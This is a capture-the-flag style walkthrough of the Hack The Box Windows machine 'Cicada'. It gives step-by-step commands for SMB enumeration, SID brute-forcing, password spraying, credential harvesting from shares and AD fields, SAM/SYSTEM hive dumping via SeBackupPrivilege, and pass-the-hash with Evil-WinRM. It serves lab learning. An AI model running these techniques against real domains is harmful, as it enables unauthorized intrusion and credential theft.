## Overview

**Machine:** Cicada

**Difficulty:** Easy

**OS:** Windows

**Points:** 0

**Release Date:** 17 January 2025

**Status:** Retired

## About

Cicada is a beginner-friendly Windows Active Directory machine that introduces several essential AD pentesting techniques, including user enumeration, password spraying, SMB share enumeration, and privilege escalation via the SeBackupPrivilege.

## TL;DR

- Enumerate SMB anonymously, find default password in HR share
- Use password spraying to get access as `michael.wrightson`
- Enumerate more users, find stored password in AD description field for `david.orelious`
- Access DEV share, download PowerShell script, leak `emily.oscars` credentials
- WinRM shell as Emily ‚Üí abuse SeBackupPrivilege
- Dump SAM + SYSTEM hives, extract Administrator NTLM hash
- Pass-the-hash ‚Üí SYSTEM access via Evil-WinRM

## SETUP / NOTES

Tools used:

- Nmap
- smbclient
- crackmapexec
- impacket-lookupsid
- evil-winrm
- impacket-secretsdump

##  RECON

Initial scan reveals it's a Windows Domain Controller:

Ports like 88 (Kerberos), 389/636 (LDAP/LDAPS), and 445 (SMB) are open. Hostname is `CICADA-DC`, domain is `cicada.htb`. Let's echo `cicada.htb` to our /etc/hosts witth `echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts`

##  ENUMERATION

### SMB Enumeration

Let's start trying if we can see the shares with `smb` without a user.

```bash
crackmapexec smb cicada.htb --shares
```

![Error-user](docs/smb%20stap%201%20error%20getting%20user.png)

Anonymous access denied. Try guest account:

```bash
crackmapexec smb cicada.htb -u guest -p '' --shares
```

![Guest-login](docs/smb%20guest%20shares%20stap%202.png)

Accessible shares: `HR` with `READ` permission.

Noted, we can read the `HR` group with the guest account. What we do now is use `smbclient` to log in as guest and inspect what `HR` holds.

```
smbclient //cicada.htb/HR
```

Using `guest` as the password, we log in as guest!

![smbdir](docs/dirsmb%20stap%203.png)

Using `dir` is the same as `ls` and makes us list the directory. It has one valuable file in there: `Notice from HR.txt`. Let's extract that file and look what is in it!

```bash
get "Notice from HR.txt"
```

use the double qoutes "" to elimate the spaces between the words.

This is inside the file

```

```

üìÑ **Password found**: `Cicada$M6Corpb*@Lp#nZp!8`

---

### AD User Enumeration

We have a password, but no users. We can't apply the password. A usefull tool called `Lookupsid` will try to brute force the `Windows Security Identifiers` or better called `SIDs` of any users in the domain. Each user has a unique SID. To enumerate the domain, we will specify the guest user and `-no-pass` because we have no password.

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass
```

![Lookupsid](docs/loopupsid%20stap%204.png)

That is alot of info. But at the bottom we can see some of the users already. But you better be sure that there are more users then `john, sarah, micheal` etc we will run it again, only we will grep the `SidTypeUser` because we only want the users and with `sed` we will remove any text other then the names that we want, and then forward it into `users.txt`.

```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
```

![grepuser](docs/grepuser%20stap%205.png)

---

### Password Spray

Now that we have the users saved in `users.txt`, it is a bit repetitive to apply the password we found to every user to see if it works. That's why we are going to **password spray** with `crackmapexec`.

Let's try to log into cicada.htb with the list of users and the default password that we found.

```bash
crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![passwordspray](docs/passwordspray%20stap%206.png)

‚úÖ Successful login: `michael.wrightson`

---

### User Enumeration as Michael

So Michael hasen't changed his default password yet. That's great! With that we will check if Michael has acces to any other shares.

![Michaelshares](docs/michaelnoshare%20stap%207.png)

Unfortunately Michael doesn't have acces to any of the other shares. But we can use his acces to look for other users on the machine.

```bash
crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![daviduser](docs/david%20stap%208.png)

Found in AD description:
üóùÔ∏è `david.orelious : aRt$Lp#7t*VQ!3`

##  EXPLOIT

### Accessing Shares as David

Great! So David used a great place to store his password. With that we will check which `shares` he has acces to.

```powershell
crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![davidsmb](docs/david%20smb%20stap%209.png)

David has more rights, he has `READ` permissions in the `DEV` share! We will immediately log in `smbclient` with the `DEV` share as David.

```powershell
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
```

![backup](docs/bakcupscript%20stap%2010.png)

Lets `get` the Backup file and see what is in it.

```bash
get Backup_script.ps1
```

üìÑ Backup script contains:

```
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Backup sorted this is what we need

```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt"
```

---

### WinRM Shell as Emily

let's be sure and check Emily her shares.

```powershell
crackmapexec smb cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

![emilyshares](docs/admin$emily%20stap%2011.png)

Emily has the permissions we want, `ADMIN$`. Remote Admin.

Let's go all in, we will use `evil-winrm` to log in the system as `emily`.

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

![emilyevil](docs/evilwinrm%20stap%2012.png)

We are inside! Let's grab the `user flag`.

```
cd ..
cd Desktop
cat user.txt
```

![userflag](docs/userflag.png)

üéâ Access to user flag.

##  PRIVILEGE ESCALATION

As you may have seen in the user flag above, there is more then `user.txt`. We have `sam` and `system` in there aswell.

- The SAM (Security Account Manager) hive contains local user account and group membership
  information, including their hashed passwords.

- he SYSTEM hive contains system-wide configuration settings, such as the system boot key
  required to decrypt the password hashes stored in SAM .

let's check if Emily has `SeBackupPrivilege`:

```bash
whoami /priv
```

![whoami](docs/priv.png)

We see that she has the `SeBackupPrivilege`, often given to service or administrative users. It enables acces to `system-protected` files while bypassing other permissions. A user account should **not** be granted this privilege as they have acces to sensitive files such as we have seen already `SYSTEM` and `SAM`.

We can use these to dump `NLTM` hases, so we can use the `Administrator` hash isntead of a password.

Before we can download the files, we will use the `reg save` command to perform a command in the registry, specify the location of
the hive, and save it to a file in the current directory with the appropriate name.

```
reg save hklm\sam sam
reg save hklm\system system
```

Now you can just download both files by using `Evil-winRM's` command:

```powershell
download sam
download system
```

![dump](docs/dumpsave%20stap%2013.png)

And now when you `exit` the `Evil-winRM` you can check with `ls` if the files are present.

Now, lets dump the hashes locally:

```bash
impacket-secretsdump -sam sam -system system local
```

This is what came out of the dump. Alof of information but remember we want the `Administrator` `NTLM` hash. The hash is the last bit of the line.

```
[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620

[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

NTLM hash for Administrator:

```
2b87e7c93a3e8a0ea4a581937016f341
```

---

### Pass-the-Hash ‚Üí SYSTEM Shell

Now we `Evil-winRM` back in as the `Administrator` as user, and the `NTLM` hash as password

```bash
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```

![root](docs/root%20final%20stap.png)
